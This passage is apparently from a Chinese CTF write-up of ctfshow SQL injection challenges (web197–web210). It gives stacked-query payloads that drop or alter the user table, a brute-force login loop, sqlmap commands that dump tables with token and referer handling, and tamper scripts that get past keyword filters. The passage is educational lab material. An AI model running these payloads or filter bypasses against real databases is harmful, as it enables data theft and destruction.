<span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0x61646d696e'</span><span class="token punctuation">,</span>  <span class="token comment"># 0</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>    <span class="token punctuation">&#125;</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"ÁôªÈôÜÊàêÂäü"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+]id </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string"> is right"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p><strong>ÊñπÊ≥ï‰∏â</strong></p><p>Êõ¥Êñ∞Ë°®„ÄÇËøáÊª§‰∫ÜupdateÔºå‰ΩÜÊàë‰ª¨ÂèØ‰ª•Âà†Ë°®ÔºåÈáçÊñ∞Âª∫‰∏Ä‰∏™ÂêåÊ†∑Ë°®ÂêçÁöÑË°®ÔºåÂàóÂêçÁªôÁöÑÊü•ËØ¢ËØ≠Âè•‰πüÂ∑≤ÁªèÂëäÁü•ÔºåÂàÜÂà´ÊòØusernameÂíåpass„ÄÇ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;drop table ctfshow_user;create table ctfshow_user(&#96;username&#96; varchar(100),&#96;pass&#96; varchar(100));insert ctfshow_user(&#96;username&#96;,&#96;pass&#96;) value(1,1)</code></pre><p>ËøôÈáåÁöÑÊÑèÊÄùÂ∞±ÊòØÂà†Èô§‰ª•ÂâçÁöÑË°®ÔºåÂÜçËá™Â∑±Êñ∞Âª∫‰∏Ä‰∏™Âπ∂‰∏îÊèíÂÖ•Êï∞ÊçÆÔºöusername&#x3D;1Ôºåpass&#x3D;1</p><p>ÁÑ∂ÂêéÁõ¥Êé•ËæìÂÖ•1‰∏∫Áî®Êà∑ÂêçÂíåÂØÜÁ†ÅÔºåÁôªÂΩïÂç≥ÂèØÂæóÂà∞flag„ÄÇ</p><h4 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h4><p>ËøáÊª§‰∫Ü<code>create</code> <code>drop</code>Ôºå‰ΩÜÂèØ‰ª•Áî®ÂÖ∂‰ªñÊñπÊ≥ï</p><h4 id="wen199"><a href="#wen199" class="headerlink" title="wen199"></a>wen199</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:ÊÑüËßâÂ∞ë‰∫Ü‰∏™Âï•ÔºåÂ•áÊÄ™,‰∏ç‰ºöÂèàÂèåÂèíÂèïË¢´‰∏ÄË°Ä‰∫ÜÂêß</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'Áî®Êà∑ÂêçÈùûÊ≥ï'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><strong>ÊñπÊ≥ï‰∏Ä</strong>ÔºöÊú¨È¢ò‰æùÁÑ∂ÂèØ‰ª•‰ΩøÁî®<code>show tables</code>„ÄÇ</p><p><strong>ÊñπÊ≥ï‰∫å</strong>ÔºöÊú¨È¢òËøáÊª§‰∫ÜÊã¨Âè∑ÔºåÈôêÂà∂‰∫Ü‰πãÂâçpayload‰∏≠ÁöÑvarchar(100)ÔºåÂèØ‰ª•Êîπ‰∏∫text„ÄÇ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;alter table ctfshow_user change &#96;pass&#96; &#96;tmp&#96; text;alter table ctfshow_user change &#96;username&#96; &#96;pass&#96; text;alter table ctfshow_user change &#96;tmp&#96; &#96;username&#96; text;</code></pre><h4 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h4><p>Â¢ûÂä†‰∫ÜÈÄóÂè∑ÁöÑËøáÊª§Ôºå‰∏çÂΩ±Âìç„ÄÇweb199ÁöÑ‰∏§‰∏™ÊñπÊ≥ïÈÉΩÂèØ‰ª•Áî®„ÄÇ</p><h4 id="web201-Sqlmap-‚Äìreferer"><a href="#web201-Sqlmap-‚Äìreferer" class="headerlink" title="web201(Sqlmap ‚Äìreferer)"></a>web201(Sqlmap ‚Äìreferer)</h4><p><a href="https://sqlmap.highlight.ink/"><a href="https://sqlmap.highlight.ink/">sqlmap Áî®Êà∑ÊâãÂÜå</a></a></p><p>SQLmap‰ΩøÁî®È°∫Â∫èÔºö</p><ol><li>Ëé∑ÂèñÂΩìÂâçMySQL‰∏≠ÁöÑÊâÄÊúâÊï∞ÊçÆÂ∫ì<code>sqlmap -u http://xxx</code></li><li>Ëé∑ÂèñÂΩìÂâçÊï∞ÊçÆÂ∫ìÂêçÂ≠ó</li><li>Ëé∑ÂèñÊï∞ÊçÆÂ∫ì‰∏ãÁöÑÊï∞ÊçÆË°®</li><li>Ëé∑ÂèñË°®‰∏ãÁöÑÂàóÂêç</li><li>ÂØºÂá∫Êï∞ÊçÆ</li></ol><p><img src="web201.png" loading="lazy"></p><p><a href="https://blog.csdn.net/qq_43621629/article/details/104515866">Sqlmap ÊÄßËÉΩ‰ºòÂåñ</a></p><p>ËÆæÁΩÆÂ§öÁ∫øÁ®ã</p><pre class="language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://127.0.0.1/sqli/Less-1/?id=1"</span> <span class="token parameter variable">--threads</span><span class="token operator">=</span><span class="token number">5</span> <span class="token parameter variable">--banner</span> <span class="token parameter variable">-v</span> <span class="token number">5</span></code></pre><p>Ë¶ÅÊ∑ªÂä†‰∏Ä‰∏™refererÂ§¥</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">Êü•Êï∞ÊçÆÂ∫ìÔºöpython sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -dbs</code></pre><p><img src="web201_2.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">Êü•Ë°®ÂêçÔºöpython sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web --tables</code></pre><p><img src="web201_3.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">Êü•ÂàóÂêçÔºöpython sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user --columns</code></pre><p><img src="web201_4.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">Êü•FlagÔºöpython sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><p><img src="web201_5.png" loading="lazy"></p><h4 id="web202-‚Äìdata"><a href="#web202-‚Äìdata" class="headerlink" title="web202(‚Äìdata)"></a>web202(‚Äìdata)</h4><p>‚Äìdata&#x3D;DATA         ËØ•ÂèÇÊï∞ÊåáÂÆöÁöÑÊï∞ÊçÆ‰ºöË¢´‰Ωú‰∏∫POSTÊï∞ÊçÆÊèê‰∫§</p><p>‰ΩøÁî®postÊñπÂºèËøõË°åÊ≥®ÂÖ•ÔºåÂèØ‰ª•Áõ¥Êé•Áî®<code>--data=&quot;id=1&quot;</code>Ôºå‰πüÂèØ‰ª•<code>--method=post</code>Êù•Ëß¶Âèë</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1.‰ΩøÁî®dataË∞ÉÊï¥ÂèÇÊï∞python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot;2.Êü•Â∫ìpython sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --dbs3.Êü•Ë°®python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web --tables4.Êü•Âàópython sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user --columns5.Êü•Flagpython sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web203-‚Äìmethod-PUT"><a href="#web203-‚Äìmethod-PUT" class="headerlink" title="web203(‚Äìmethod&#x3D;PUT)"></a>web203(‚Äìmethod&#x3D;PUT)</h4><p><strong>HTTP <code>PUT</code> ËØ∑Ê±ÇÊñπÊ≥ï</strong>ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑËµÑÊ∫êÊàñÁî®ËØ∑Ê±ÇÁöÑÊúâÊïàËΩΩËç∑ÊõøÊç¢ÁõÆÊ†áËµÑÊ∫êÁöÑË°®Á§∫„ÄÇ</p><p><code>PUT</code> ‰∏é <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a> ÊñπÊ≥ïÁöÑÂå∫Âà´ÊòØÔºå<code>PUT</code> ÊñπÊ≥ïÊòØÂπÇÁ≠âÁöÑÔºöË∞ÉÁî®‰∏ÄÊ¨°‰∏éËøûÁª≠Ë∞ÉÁî®Â§öÊ¨°ÊïàÊûúÊòØÁõ∏ÂêåÁöÑÔºàÂç≥Ê≤°Êúâ<em>ÂâØ</em>‰ΩúÁî®ÔºâÔºåËÄåËøûÁª≠Ë∞ÉÁî®Â§öÊ¨°Áõ∏ÂêåÁöÑ <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a> ÊñπÊ≥ïÂèØËÉΩ‰ºöÊúâÂâØ‰ΩúÁî®ÔºåÊØîÂ¶ÇÂ§öÊ¨°Êèê‰∫§Âêå‰∏ÄËÆ¢Âçï„ÄÇ</p><p>ÊåáÂÆö<code>--method=PUT</code>ÊñπÊ≥ïÔºåÂêåÊó∂**Âä†‰∏ä<code>--headers=&quot;Content-Type:text/plain</code>**ÔºåÂê¶ÂàôputÊé•Âèó‰∏ç‰∫Ü„ÄÇÂêåÊó∂ÔºåË¶ÅÂä†‰∏äindex.phpÔºå<code>url/api/index.php</code></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;6792f785-47eb-4ea4-b098-0123488759c4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web204-‚Äìcookie"><a href="#web204-‚Äìcookie" class="headerlink" title="web204(‚Äìcookie)"></a>web204(‚Äìcookie)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;87742487-acec-4728-91da-8113d95b32cf.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;9tgbnd43m59t71te1u80d66pjs; ctfshow&#x3D;8c61071229d48923c7ced01b20ec493e&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;87742487-acec-4728-91da-8113d95b32cf.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;9tgbnd43m59t71te1u80d66pjs; ctfshow&#x3D;8c61071229d48923c7ced01b20ec493e&quot; --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql dbs&#x3D;ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web205-apiÊùÉÈôê"><a href="#web205-apiÊùÉÈôê" class="headerlink" title="web205(apiÊùÉÈôê)"></a>web205(apiÊùÉÈôê)</h4><p>apiË∞ÉÁî®ÈúÄË¶ÅÈâ¥ÊùÉ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">--</span>safe<span class="token operator">-</span>url ËÆæÁΩÆÂú®ÊµãËØïÁõÆÊ†áÂú∞ÂùÄÂâçËÆøÈóÆÁöÑÂÆâÂÖ®ÈìæÊé•<span class="token operator">--</span>safe<span class="token operator">-</span>freq ËÆæÁΩÆ‰∏§Ê¨°Ê≥®ÂÖ•ÊµãËØïÂâçËÆøÈóÆÂÆâÂÖ®ÈìæÊé•ÁöÑÊ¨°Êï∞</code></pre><p>ÈÄöËøáF12‰∏≠networkÊäìÂåÖÂèØ‰ª•ÁúãËßÅÔºåÊúâ‰∏Ä‰∏™<code>getToken.php</code>ÁöÑËØ∑Ê±ÇtokenÁöÑÂä®‰ΩúÔºõ</p><p><img src="web205.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;a530a88b-1bce-49ce-bfee-18b37febf906.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;bllqt44686hm6msc9ti5ruevpb&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;a530a88b-1bce-49ce-bfee-18b37febf906.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql -D ctfshow_web -T ctfshow_flax -C flagx --dump</code></pre><p>Ëøô‰∏™È¢òÊç¢‰∫ÜË°®ÂêçÂíåÂàóÂêç</p><h4 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h4><p>sqlÈúÄË¶ÅÈó≠ÂêàÔºåsqlmap‰ºöËá™Âä®Èó≠ÂêàÔºåPayloadÂêå‰∏ä</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;34b88ba2-58d2-4a8c-9b6f-3b1b0e663a27.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;3ehcblk49o3nqd3hp3nqsdr0ga&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;34b88ba2-58d2-4a8c-9b6f-3b1b0e663a27.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql -D ctfshow_web -T ctfshow_flaxc -C flagv --dump</code></pre><h4 id="web207-‚Äìtamper"><a href="#web207-‚Äìtamper" class="headerlink" title="web207(‚Äìtamper)"></a>web207(‚Äìtamper)</h4><p><a href="https://y4er.com/posts/sqlmap-tamper/">Sqlmap Tamper ÁºñÂÜô</a></p><p><code>--batch</code>‰ΩøÁî®ÈªòËÆ§ÁöÑÈÄâÈ°πËøõË°åÊ≥®ÂÖ•ÔºåÊó†ÈúÄÁî®Êà∑ËæìÂÖ•Âíå‰∫§‰∫í<br><code>--prefix=PREFIX</code>ÊåáÂÆöpayloadÁöÑÂâçÁºÄ<br><code>--suffix=SUFFIX</code>ÊåáÂÆöpayloadÁöÑÂêéÁºÄ</p><p>È¢òÁõÆÂØπÁ©∫Ê†ºËøõË°å‰∫ÜËøáÊª§ÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ËÄÉËôëÁî®space2comment.pyËøô‰∏™ËÑöÊú¨ÔºåÂ∞ÜÁ©∫Ê†ºËΩ¨Êç¢ÊàêÊ≥®ÈáäÁ¨¶Êù•ÁªïËøá</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --data&#x3D;&quot;id&#x3D;1&quot; --prefix&#x3D;&quot;&#39;)&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --batch --tamper&#x3D;space2comment</code></pre><h4 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h4><p>ÂØπÂ∞èÂÜôÁöÑ<code>select</code>ÂíåÁ©∫Ê†ºËøõË°å‰∫ÜÁªïËøáÔºå‰∏çËøásqlmap‰∏≠ÁöÑselectÈÉΩÊòØÂ§ßÂÜôÁöÑ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">import</span> os<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>common <span class="token keyword">import</span> singleTimeWarnMessage<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> DBMS<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>HIGHEST<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"SELECT"</span><span class="token punctuation">,</span> <span class="token string">"select"</span><span class="token punctuation">)</span><span class="token comment">#Â∞±‰øÆÊîπËøô‰∏ÄË°å‰∫Ü</span>    <span class="token keyword">return</span> payload</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --data&#x3D;&quot;id&#x3D;1&quot; --prefix&#x3D;&quot;&#39;)&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --batch --tamper&#x3D;space2comment</code></pre><h4 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h4><p>ËøáÊª§‰∫Ü<code> </code>Ôºå<code>*</code>Âè∑Âíå<code>=</code>Ôºå</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;d5249ee4-9520-4049-a7f0-d3cc15ccc88a.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;d5249ee4-9520-4049-a7f0-d3cc15ccc88a.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;1763p4504m3dcol5349rfgt5q9&quot; --tamper web209.py -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump --batch</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Replaces space character (' ') with comments '/**/'    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    >>> tamper('SELECT id FROM users')    'SELECT/**/id/**/FROM/**/users'    """</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token string">"/**/"</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x2A</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'like'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                <span class="token comment"># retVal += "/**/"</span>                retVal <span class="token operator">+=</span> char<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal</code></pre><h4 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ÂØπÊü•ËØ¢Â≠óÁ¨¶ËøõË°åËß£ÂØÜ</span>  <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>      </code></pre><p>ÂØπ‰º†ÂÖ•ÁöÑid ËøõË°åËß£ÂØÜÂ§ÑÁêÜ ‰ªéËÄåËÆ©sqlËØ≠Âè•Êó†Ê≥ïÊâßË°åÊàêÂäü </p><p>ÊåâÁÖß‰ªñÁöÑÊñπÂºè ÂèçÁùÄÊûÑÈÄ†‰∏Ä‰∏™Âä†ÂØÜËÑöÊú¨ ËøôÊ†∑‰º†ËøõÂéªÂêé ÊúçÂä°Âô®ÂØπidËøõË°å‰∏ÄÁ≥ªÂàóÊìç‰ΩúÂ∞±ÂèòÊàê‰∫Ü Êàë‰ª¨ÊÉ≥Âà∞ÁöÑidÁöÑÂÄº‰∫Ü</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;30e6ea25-0680-4bf6-af39-8be519b7bd22.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;30e6ea25-0680-4bf6-af39-8be519b7bd22.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;9j6o3g1dvnmvg061n1kbjlruvp&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch</code></pre><p><strong>web210.py</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Author:Y4tacker"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span 